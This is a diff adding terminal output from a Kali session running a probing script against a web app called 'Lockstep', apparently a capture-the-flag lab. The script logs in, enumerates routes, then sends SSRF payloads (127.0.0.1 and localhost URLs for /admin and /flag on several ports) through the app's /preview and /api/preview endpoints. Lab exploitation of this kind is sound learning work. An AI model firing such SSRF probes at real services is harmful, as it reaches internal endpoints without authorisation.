@@ -1,0 +1,82 @@
+
+python3 -u /tmp/lockstep.py
+===== LOGIN =====
+LOGIN PAGE 200 <!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Sign in · Lockstep</title>
+  <style>
+    :root{--bg:#0b1017;--panel:#111a25;--panel2:#162331;--line:#263747;--text:#e9f0f6;--muted:#92a4b6;--accent:#b8f36b;--red:#ff8f8f}
+    *{box-sizing:border-box}body{margin:0;background:radial-gradient(ellipse at 15% 0%,#172a37 0,transparent 40%),var(--bg);color:var(--text);font:15px/1.55 Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,sans-serif}
+    a{color:var(--accent);text-decoration:none}a:hover{text-decoration:underline}.wrap{max-width:1020px;margin:0 auto;padding:26px 22px}
+    header{display:flex;j
+AUTH /login form 302 /dashboard <!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automat
+AUTH /auth/login form 404 None <!doctype html>
+<html lang=en>
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the
+AUTH /auth/login json 404 None <!doctype html>
+<html lang=en>
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the
+
+===== ROUTES =====
+ROUTE / 200 None
+BODY <!doctype html> <html lang="fr"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>Lockstep · Workspace tools</title> <style> :root{--bg:#0b1017;--panel:#111a25;--panel2:#162331;--line:#263747;--text:#e9f0f6;--muted:#92a4b6;--accent:#b8f36b;--red:#ff8f8f} *{box-sizing:border-box}body{margin:0;background:radial-gradient(ellipse at 15% 0%,#172a37 0,transparent 40%),var(--bg);color:var(--text);font:15px/1.55 Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,sans-serif} a{color:var(--accent);text-decoration:none}a:hover{text-decoration:underline}.wrap{max-width:1020px;margin:0 auto;padding:26px 22px} header{display:flex;justify-content:space-between;align-items:center;gap:18px;border-bottom:1px solid var(--line);padding-bottom:20px;margin-bottom:34px} .brand{display:flex;align-items:center;gap:12px;font-weight:800;letter-spacing:.02e
+ROUTE /dashboard 200 None
+BODY <!doctype html> <html lang="fr"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>Workspace · Lockstep</title> <style> :root{--bg:#0b1017;--panel:#111a25;--panel2:#162331;--line:#263747;--text:#e9f0f6;--muted:#92a4b6;--accent:#b8f36b;--red:#ff8f8f} *{box-sizing:border-box}body{margin:0;background:radial-gradient(ellipse at 15% 0%,#172a37 0,transparent 40%),var(--bg);color:var(--text);font:15px/1.55 Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,sans-serif} a{color:var(--accent);text-decoration:none}a:hover{text-decoration:underline}.wrap{max-width:1020px;margin:0 auto;padding:26px 22px} header{display:flex;justify-content:space-between;align-items:center;gap:18px;border-bottom:1px solid var(--line);padding-bottom:20px;margin-bottom:34px} .brand{display:flex;align-items:center;gap:12px;font-weight:800;letter-spacing:.02em}.mar
+ROUTE /preview 200 None
+BODY <!doctype html> <html lang="fr"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>URL Preview · Lockstep</title> <style> :root{--bg:#0b1017;--panel:#111a25;--panel2:#162331;--line:#263747;--text:#e9f0f6;--muted:#92a4b6;--accent:#b8f36b;--red:#ff8f8f} *{box-sizing:border-box}body{margin:0;background:radial-gradient(ellipse at 15% 0%,#172a37 0,transparent 40%),var(--bg);color:var(--text);font:15px/1.55 Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,sans-serif} a{color:var(--accent);text-decoration:none}a:hover{text-decoration:underline}.wrap{max-width:1020px;margin:0 auto;padding:26px 22px} header{display:flex;justify-content:space-between;align-items:center;gap:18px;border-bottom:1px solid var(--line);padding-bottom:20px;margin-bottom:34px} .brand{display:flex;align-items:center;gap:12px;font-weight:800;letter-spacing:.02em}.m
+ROUTE /api/preview 404 None
+BODY <!doctype html> <html lang=en> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p> 
+ROUTE /admin 403 None
+BODY <!doctype html> <html lang=en> <title>403 Forbidden</title> <h1>Forbidden</h1> <p>You don&#39;t have the permission to access the requested resource. It is either read-protected or not readable by the server.</p> 
+ROUTE /admin/dashboard 404 None
+BODY <!doctype html> <html lang=en> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p> 
+
+===== SSRF =====
+SSRF GET /preview http://127.0.0.1/admin 200 <!doctype html> <html lang="fr"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>URL Preview · Lockstep</title> <style> :root{--bg:#0b1017;--panel:#111a25;--panel2:#162331;--line:#263747;--tex
+SSRF POST /preview http://127.0.0.1/admin 200 <!doctype html> <html lang="fr"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>URL Preview · Lockstep</title> <style> :root{--bg:#0b1017;--panel:#111a25;--panel2:#162331;--line:#263747;--tex
+SSRF GET /preview http://localhost/admin 200 <!doctype html> <html lang="fr"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>URL Preview · Lockstep</title> <style> :root{--bg:#0b1017;--panel:#111a25;--panel2:#162331;--line:#263747;--tex
+SSRF POST /preview http://localhost/admin 200 <!doctype html> <html lang="fr"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>URL Preview · Lockstep</title> <style> :root{--bg:#0b1017;--panel:#111a25;--panel2:#162331;--line:#263747;--tex
+SSRF GET /preview http://127.0.0.1:5000/admin 200 <!doctype html> <html lang="fr"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>URL Preview · Lockstep</title> <style> :root{--bg:#0b1017;--panel:#111a25;--panel2:#162331;--line:#263747;--tex
+SSRF POST /preview http://127.0.0.1:5000/admin 200 <!doctype html> <html lang="fr"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>URL Preview · Lockstep</title> <style> :root{--bg:#0b1017;--panel:#111a25;--panel2:#162331;--line:#263747;--tex
+SSRF GET /preview http://localhost:5000/admin 200 <!doctype html> <html lang="fr"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>URL Preview · Lockstep</title> <style> :root{--bg:#0b1017;--panel:#111a25;--panel2:#162331;--line:#263747;--tex
+SSRF POST /preview http://localhost:5000/admin 200 <!doctype html> <html lang="fr"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>URL Preview · Lockstep</title> <style> :root{--bg:#0b1017;--panel:#111a25;--panel2:#162331;--line:#263747;--tex
+SSRF GET /preview http://127.0.0.1:8000/admin 200 <!doctype html> <html lang="fr"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>URL Preview · Lockstep</title> <style> :root{--bg:#0b1017;--panel:#111a25;--panel2:#162331;--line:#263747;--tex
+SSRF POST /preview http://127.0.0.1:8000/admin 200 <!doctype html> <html lang="fr"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>URL Preview · Lockstep</title> <style> :root{--bg:#0b1017;--panel:#111a25;--panel2:#162331;--line:#263747;--tex
+SSRF GET /preview http://127.0.0.1:8080/admin 200 <!doctype html> <html lang="fr"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>URL Preview · Lockstep</title> <style> :root{--bg:#0b1017;--panel:#111a25;--panel2:#162331;--line:#263747;--tex
+SSRF POST /preview http://127.0.0.1:8080/admin 200 <!doctype html> <html lang="fr"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>URL Preview · Lockstep</title> <style> :root{--bg:#0b1017;--panel:#111a25;--panel2:#162331;--line:#263747;--tex
+SSRF GET /preview http://127.0.0.1/admin/flag 200 <!doctype html> <html lang="fr"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>URL Preview · Lockstep</title> <style> :root{--bg:#0b1017;--panel:#111a25;--panel2:#162331;--line:#263747;--tex
+SSRF POST /preview http://127.0.0.1/admin/flag 200 <!doctype html> <html lang="fr"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>URL Preview · Lockstep</title> <style> :root{--bg:#0b1017;--panel:#111a25;--panel2:#162331;--line:#263747;--tex
+SSRF GET /preview http://127.0.0.1/flag 200 <!doctype html> <html lang="fr"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>URL Preview · Lockstep</title> <style> :root{--bg:#0b1017;--panel:#111a25;--panel2:#162331;--line:#263747;--tex
+SSRF POST /preview http://127.0.0.1/flag 200 <!doctype html> <html lang="fr"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>URL Preview · Lockstep</title> <style> :root{--bg:#0b1017;--panel:#111a25;--panel2:#162331;--line:#263747;--tex
+SSRF GET /api/preview http://127.0.0.1/admin 404 <!doctype html> <html lang=en> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p> 
+SSRF POST /api/preview http://127.0.0.1/admin 404 <!doctype html> <html lang=en> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p> 
+SSRF GET /api/preview http://localhost/admin 404 <!doctype html> <html lang=en> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p> 
+SSRF POST /api/preview http://localhost/admin 404 <!doctype html> <html lang=en> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p> 
+SSRF GET /api/preview http://127.0.0.1:5000/admin 404 <!doctype html> <html lang=en> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p> 
+SSRF POST /api/preview http://127.0.0.1:5000/admin 404 <!doctype html> <html lang=en> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p> 
+SSRF GET /api/preview http://localhost:5000/admin 404 <!doctype html> <html lang=en> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p> 
+SSRF POST /api/preview http://localhost:5000/admin 404 <!doctype html> <html lang=en> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p> 
+SSRF GET /api/preview http://127.0.0.1:8000/admin 404 <!doctype html> <html lang=en> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p> 
+SSRF POST /api/preview http://127.0.0.1:8000/admin 404 <!doctype html> <html lang=en> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p> 
+SSRF GET /api/preview http://127.0.0.1:8080/admin 404 <!doctype html> <html lang=en> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p> 
+SSRF POST /api/preview http://127.0.0.1:8080/admin 404 <!doctype html> <html lang=en> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p> 
+SSRF GET /api/preview http://127.0.0.1/admin/flag 404 <!doctype html> <html lang=en> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p> 
+SSRF POST /api/preview http://127.0.0.1/admin/flag 404 <!doctype html> <html lang=en> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p> 
+SSRF GET /api/preview http://127.0.0.1/flag 404 <!doctype html> <html lang=en> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p> 
+SSRF POST /api/preview http://127.0.0.1/flag 404 <!doctype html> <html lang=en> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p> 
+[*] FIN
+                                                                                                                       
+┌──(xhackerip㉿xkali)-[/tmp/be_git]
+└─$ 
+
